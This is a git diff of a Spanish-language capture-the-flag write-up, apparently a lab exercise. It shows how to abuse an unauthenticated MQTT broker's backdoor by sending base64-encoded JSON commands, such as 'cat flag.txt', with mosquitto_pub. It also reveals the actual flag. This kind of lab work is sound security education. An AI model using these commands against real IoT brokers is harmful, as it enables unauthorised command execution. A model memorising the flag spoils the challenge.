@@ -118,10 +118,13 @@ mosquitto_sub -h 10.201.97.52 -t "U4vyqNlQtf/0voZmaZyLT/15H9TF6CHg/pub" -v
 ```bash
 mosquitto_pub -h 10.201.97.52 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "HOLA"
 ```
+
 <img width="1898" height="167" alt="Captura de pantalla 2025-11-16 015601" src="https://github.com/user-attachments/assets/1cf96908-b552-43df-a906-254aa15d18eb" />
 
 Respuesta: `Invalid message format. Format: base64({"id":"<id>","cmd":"<CMD>","arg":"<ARG>"})`
+
 <img width="1899" height="218" alt="Captura de pantalla 2025-11-16 015723" src="https://github.com/user-attachments/assets/bc4f6eb9-be47-4c05-96b3-4863db71febe" />
+
 <img width="1906" height="208" alt="Captura de pantalla 2025-11-16 015823" src="https://github.com/user-attachments/assets/fc075d76-0875-4cd0-b790-76f2e4a8a617" />
 
 ---
@@ -153,6 +156,8 @@ Respuesta (oyente) en base64; al decodificar se ve:
 flag.txt
 ```
 
+<img width="1888" height="87" alt="Captura de pantalla 2025-11-16 020155" src="https://github.com/user-attachments/assets/e6e9831a-08c0-4e06-a391-1de89a34f313" />
+
 ---
 
 ## 4.4 Leer la flag
@@ -163,7 +168,6 @@ Codificar y enviar:
 echo -n '{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","cmd":"CMD","arg":"cat flag.txt"}' | base64
 ```
 
-
 Ejemplo payload:
 
 ```
@@ -172,31 +176,32 @@ eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIs
 
 Enviar con `mosquitto_pub` (igual que antes).
 
+<img width="1396" height="74" alt="Captura de pantalla 2025-11-16 030055" src="https://github.com/user-attachments/assets/ea8aa0f2-a245-4def-ba36-860530de7acd" />
+
 La respuesta final será una cadena base64:
 
-```
-VEhNe2...[FLAG]...fQo=
-```
+<img width="1902" height="231" alt="Captura de pantalla 2025-11-16 020253" src="https://github.com/user-attachments/assets/5ca97420-cd44-420b-a98e-0489380b73b8" />
+
 
 Decodificar:
 
 ```bash
-echo "VEhNe2...[FLAG]...fQo=" | base64 -d
+echo "message_base64" | base64 -d
 ```
 
+<img width="1898" height="525" alt="Captura de pantalla 2025-11-16 020327" src="https://github.com/user-attachments/assets/9c49306b-eea0-4080-b25f-cc64276240d3" />
 
 Resultado:
 
 ```
-flag{}
+flag{18d44fc0707ac8dc8be45bb83db54013}
 ```
-<img width="1898" height="525" alt="Captura de pantalla 2025-11-16 020327" src="https://github.com/user-attachments/assets/9c49306b-eea0-4080-b25f-cc64276240d3" />
 
 ---
 
-# 🎯 Conclusión — Lecciones aprendidas
+# Lecciones aprendidas
 
-- No ignores puertos IoT (ej. 1883).  
-- Brokers MQTT sin autenticación pueden ser backdoors.  
-- Los mensajes de error a menudo dan pistas estructurales útiles.  
+- No ignores puertos IoT (ej. 1883).
+- Brokers MQTT sin autenticación pueden ser backdoors.
+- Los mensajes de error a menudo dan pistas estructurales útiles.
 - Base64 es codificación, no protección.
